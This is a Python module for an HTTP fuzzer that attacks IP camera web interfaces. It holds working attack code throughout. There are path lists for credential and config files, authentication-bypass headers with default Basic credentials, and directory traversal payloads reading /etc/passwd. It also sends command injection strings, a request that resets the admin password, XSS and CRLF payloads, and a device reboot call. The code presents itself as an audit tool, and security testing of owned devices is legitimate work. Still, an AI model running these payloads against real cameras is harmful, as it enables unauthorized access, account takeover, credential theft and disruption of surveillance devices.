"""
HTTP Fuzzer Module - Fuzzes camera web interfaces.
Tests: path enumeration, parameter injection, auth bypass,
directory traversal, CGI abuse, firmware endpoints.
"""

import socket
import ssl
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote


CAMERA_HTTP_PATHS = [
    # Admin panels
    "/", "/admin", "/admin/", "/administrator",
    "/login", "/login.htm", "/login.html", "/login.asp",
    "/login.cgi", "/login.php", "/index.html",
    "/web/", "/web/index.html", "/doc/page/login.asp",

    # Snapshots & streams
    "/snap.jpg", "/snapshot.cgi", "/snapshot.jpg",
    "/cgi-bin/snapshot.cgi", "/image/jpeg.cgi",
    "/cgi-bin/viewer/video.jpg", "/Streaming/channels/1/picture",
    "/onvif-http/snapshot", "/ISAPI/Streaming/channels/1/picture",
    "/camera/snapshot.jpg", "/capture.jpg",
    "/video.mjpg", "/mjpg/video.mjpg", "/videostream.cgi",
    "/cgi-bin/video.cgi", "/live/stream", "/live.html",

    # CGI endpoints
    "/cgi-bin/", "/cgi-bin/admin.cgi",
    "/cgi-bin/param.cgi", "/cgi-bin/hi3510/param.cgi",
    "/cgi-bin/magicBox.cgi?action=getDeviceType",
    "/cgi-bin/configManager.cgi?action=getConfig&name=All",
    "/cgi-bin/userManager.cgi?action=getAll",
    "/ISAPI/System/deviceInfo",
    "/ISAPI/Security/users", "/ISAPI/Security/users/1",
    "/System/configurationFile?auth=YWRtaW46MTEK",

    # Config & backup
    "/config/", "/conf/", "/configuration/",
    "/system.ini", "/system.cfg", "/config.json",
    "/backup.tar.gz", "/firmware.bin",
    "/cgi-bin/export_log.cgi", "/export/config",
    "/device.rsp", "/goform/", "/boa/",
    "/System/backup", "/System/factory",

    # Debug & devtools
    "/debug", "/debug/", "/console", "/shell",
    "/cgi-bin/gw.cgi", "/cgi-bin/test.cgi",
    "/cgi-bin/server_test.cgi", "/proc/kcore",
    "/api/v1/system", "/api/v1/users",
    "/SDK/", "/sdk/activateStatus",
    "/onvif/device_service", "/onvif/media_service",

    # Firmware / update
    "/update", "/upgrade", "/firmware/",
    "/cgi-bin/firmware_upgrade.cgi",
    "/flashimg.cgi", "/upgrade_firmware.cgi",

    # Default Dahua paths
    "/cgi-bin/magicBox.cgi?action=getSystemInfo",
    "/cgi-bin/magicBox.cgi?action=getProductDefinition",
    "/cgi-bin/snapshot.cgi?channel=1",
    "/cgi-bin/configManager.cgi?action=getConfig&name=Network",

    # Default Hikvision paths
    "/ISAPI/System/status", "/ISAPI/System/time",
    "/ISAPI/Streaming/channels", "/ISAPI/PTZCtrl/channels/1/status",
    "/ISAPI/Security/adminAccesses",
    "/doc/page/config.asp",

    # Misc paths
    "/tmpfs/", "/tmpfs/auto.jpg", "/mnt/",
    "/etc/passwd", "/etc/shadow",
    "/proc/self/environ", "/var/log/messages",
    "/media/", "/sd/", "/mmc/",
    "/.htpasswd", "/.env", "/robots.txt",
    "/server-status", "/server-info",
    "/phpinfo.php", "/info.php",
    "/test.cgi", "/setup.cgi",
]

AUTH_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"Authorization": "Basic YWRtaW46"},
    {"Authorization": "Basic YWRtaW46YWRtaW4="},
    {"Authorization": "Basic YWRtaW46MTIzNDU="},
    {"Cookie": "admin=1; role=admin"},
]


class HTTPFuzzer:
    def __init__(self, target, port=80, timeout=5, verbose=0,
                 threads=10, depth=2, wordlist=None):
        self.target = target
        self.port = port
        self.timeout = timeout
        self.verbose = verbose
        self.threads = threads
        self.depth = depth
        self.wordlist = wordlist
        self.findings = []
        self.lock = threading.Lock()
        self.use_ssl = port in (443, 8443)

    def run(self):
        self._fuzz_paths()
        self._test_auth_bypass()
        self._test_traversal()
        self._test_parameter_injection()
        self._test_cgi_abuse()
        return self.findings

    def _http_request(self, method, path, headers=None, body=None):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)

            if self.use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=self.target)

            sock.connect((self.target, self.port))

            request = f"{method} {path} HTTP/1.1\r\n"
            request += f"Host: {self.target}\r\n"
            request += "User-Agent: Mozilla/5.0 (compatible; CameraAudit/1.0)\r\n"
            request += "Connection: close\r\n"

            if headers:
                for key, value in headers.items():
                    request += f"{key}: {value}\r\n"

            if body:
                request += f"Content-Length: {len(body)}\r\n"
                request += f"Content-Type: application/x-www-form-urlencoded\r\n"
                request += f"\r\n{body}"
            else:
                request += "\r\n"

            sock.send(request.encode())
            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            sock.close()
            return self._parse_http_response(response)
        except (socket.timeout, socket.error, ssl.SSLError, OSError):
            return None

    def _parse_http_response(self, response):
        if not response:
            return None
        try:
            decoded = response.decode("utf-8", errors="replace")
            parts = decoded.split("\r\n\r\n", 1)
            header_section = parts[0]
            body = parts[1] if len(parts) > 1 else ""

            first_line = header_section.split("\r\n")[0]
            status_code = None
            parts_line = first_line.split(" ", 2)
            if len(parts_line) >= 2:
                try:
                    status_code = int(parts_line[1])
                except ValueError:
                    pass

            return {
                "status_code": status_code,
                "headers": header_section,
                "body": body,
                "size": len(response)
            }
        except Exception:
            return None

    def _fuzz_paths(self):
        paths = list(CAMERA_HTTP_PATHS)

        if self.wordlist:
            try:
                with open(self.wordlist, "r") as f:
                    custom_paths = [line.strip() for line in f if line.strip()]
                    paths.extend(custom_paths)
            except FileNotFoundError:
                print(f"    [!] Wordlist not found: {self.wordlist}")

        if self.verbose:
            print(f"    [i] Fuzzing {len(paths)} HTTP paths...")

        accessible = []
        interesting = []

        def test_path(path):
            resp = self._http_request("GET", path)
            if not resp:
                return None, None

            if resp["status_code"] == 200:
                size = resp["size"]
                is_interesting = self._is_interesting_response(resp, path)
                return path, {"status": 200, "size": size, "interesting": is_interesting}
            elif resp["status_code"] in (301, 302, 303, 307):
                return path, {"status": resp["status_code"], "redirect": True}
            return None, None

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_path, p): p for p in paths}
            for future in as_completed(futures):
                path, result = future.result()
                if path and result:
                    if result.get("interesting"):
                        interesting.append({"path": path, **result})
                        if self.verbose:
                            print(f"    [+] Interesting: {path} ({result['size']} bytes)")
                    else:
                        accessible.append({"path": path, **result})

        if interesting:
            self.findings.append({
                "type": "http_sensitive_paths",
                "severity": "high",
                "title": "Sensitive HTTP Endpoints Exposed",
                "description": f"{len(interesting)} sensitive path(s) accessible",
                "target": f"http{'s' if self.use_ssl else ''}://{self.target}:{self.port}",
                "evidence": interesting[:20]
            })
            print(f"    [+] Found {len(interesting)} sensitive endpoint(s)")

        if accessible:
            self.findings.append({
                "type": "http_paths_accessible",
                "severity": "medium",
                "title": "HTTP Paths Accessible",
                "description": f"{len(accessible)} path(s) returned 200 OK",
                "target": f"http{'s' if self.use_ssl else ''}://{self.target}:{self.port}",
                "evidence": [a["path"] for a in accessible[:30]]
            })

    def _is_interesting_response(self, resp, path):
        body_lower = resp["body"].lower()
        sensitive_indicators = [
            "root:", "admin:", "password", "passwd",
            "firmware", "serial", "mac address",
            "private key", "-----begin", "database",
            "config", "token", "secret", "api_key",
            "shadow", "proc/", "etc/", "system32"
        ]
        for indicator in sensitive_indicators:
            if indicator in body_lower:
                return True

        sensitive_extensions = [
            ".cfg", ".ini", ".conf", ".bak", ".tar",
            ".gz", ".bin", ".key", ".pem"
        ]
        for ext in sensitive_extensions:
            if path.endswith(ext):
                return True

        return False

    def _test_auth_bypass(self):
        if self.verbose:
            print("    [i] Testing HTTP auth bypass techniques...")

        baseline = self._http_request("GET", "/")
        if not baseline or baseline["status_code"] != 401:
            return

        for bypass_headers in AUTH_BYPASS_HEADERS:
            resp = self._http_request("GET", "/", headers=bypass_headers)
            if resp and resp["status_code"] == 200:
                self.findings.append({
                    "type": "http_auth_bypass",
                    "severity": "critical",
                    "title": "HTTP Authentication Bypass",
                    "description": f"Auth bypassed using headers: {bypass_headers}",
                    "target": f"http{'s' if self.use_ssl else ''}://{self.target}:{self.port}/",
                    "evidence": str(bypass_headers)
                })
                print(f"    [!] CRITICAL: Auth bypass with {bypass_headers}")
                break

        # Method override
        for method in ["PUT", "DELETE", "PATCH", "PROPFIND"]:
            resp = self._http_request(method, "/")
            if resp and resp["status_code"] == 200:
                self.findings.append({
                    "type": "http_method_bypass",
                    "severity": "high",
                    "title": f"HTTP Method Bypass ({method})",
                    "description": f"Auth bypassed using {method} method",
                    "target": f"http{'s' if self.use_ssl else ''}://{self.target}:{self.port}/",
                    "evidence": f"{method} returned 200"
                })

    def _test_traversal(self):
        if self.verbose:
            print("    [i] Testing directory traversal...")

        traversal_payloads = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "....//....//....//etc/passwd",
            "..%5c..%5c..%5cetc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "..%00/..%00/..%00/etc/passwd",
            "../../../proc/self/cmdline",
            "../../../etc/camera.conf",
            "../../../mnt/mtd/Config/Account1",
        ]

        base_paths = ["/cgi-bin/", "/", "/web/", "/doc/"]

        for base in base_paths:
            for payload in traversal_payloads:
                path = f"{base}{payload}"
                resp = self._http_request("GET", path)
                if resp and resp["status_code"] == 200:
                    if any(x in resp["body"] for x in ["root:", "daemon:", "nobody:", "[global]"]):
                        self.findings.append({
                            "type": "http_path_traversal",
                            "severity": "critical",
                            "title": "Directory Traversal - File Read",
                            "description": f"Path traversal at {path}",
                            "target": f"http{'s' if self.use_ssl else ''}://{self.target}:{self.port}{path}",
                            "evidence": resp["body"][:200]
                        })
                        print(f"    [!] CRITICAL: Path traversal: {path}")
                        return

    def _test_parameter_injection(self):
        if self.verbose:
            print("    [i] Testing parameter injection...")

        injection_tests = [
            ("/cgi-bin/param.cgi?cmd=getuser;cat+/etc/passwd", "command_injection"),
            ("/set_ftp.cgi?next_url=|id|", "command_injection"),
            ("/cgi-bin/hi3510/param.cgi?cmd=setuser&-name=admin&-passwd=hackt", "param_tampering"),
            ("/goform/WifiBasicSet?WifiEnable=1&WifiSsid=test%22%3E%3Cscript%3E", "xss"),
            ("/cgi-bin/snapshot.cgi?channel=1%0d%0aInjected-Header:+true", "crlf_injection"),
        ]

        for path, vuln_type in injection_tests:
            resp = self._http_request("GET", path)
            if resp and resp["status_code"] == 200:
                if vuln_type == "command_injection" and any(
                    x in resp["body"] for x in ["root:", "uid=", "daemon:"]
                ):
                    self.findings.append({
                        "type": f"http_{vuln_type}",
                        "severity": "critical",
                        "title": f"Command Injection via HTTP",
                        "description": f"OS command injection at {path.split('?')[0]}",
                        "target": f"http{'s' if self.use_ssl else ''}://{self.target}:{self.port}{path}",
                        "evidence": resp["body"][:200]
                    })
                    print(f"    [!] CRITICAL: Command injection: {path}")

    def _test_cgi_abuse(self):
        if self.verbose:
            print("    [i] Testing CGI endpoint abuse...")

        # Test for common camera CGI vulns
        cgi_tests = [
            "/cgi-bin/magicBox.cgi?action=getDeviceType",
            "/cgi-bin/magicBox.cgi?action=reboot",
            "/cgi-bin/configManager.cgi?action=getConfig&name=Account",
            "/cgi-bin/userManager.cgi?action=getGroupInfoAll",
            "/ISAPI/Security/users/1",
            "/ISAPI/System/Network/interfaces",
        ]

        for path in cgi_tests:
            resp = self._http_request("GET", path)
            if resp and resp["status_code"] == 200 and len(resp["body"]) > 50:
                self.findings.append({
                    "type": "http_cgi_info_leak",
                    "severity": "high",
                    "title": f"CGI Information Disclosure",
                    "description": f"Sensitive CGI endpoint accessible: {path}",
                    "target": f"http{'s' if self.use_ssl else ''}://{self.target}:{self.port}{path}",
                    "evidence": resp["body"][:300]
                })
                if self.verbose:
                    print(f"    [+] CGI leak: {path}")
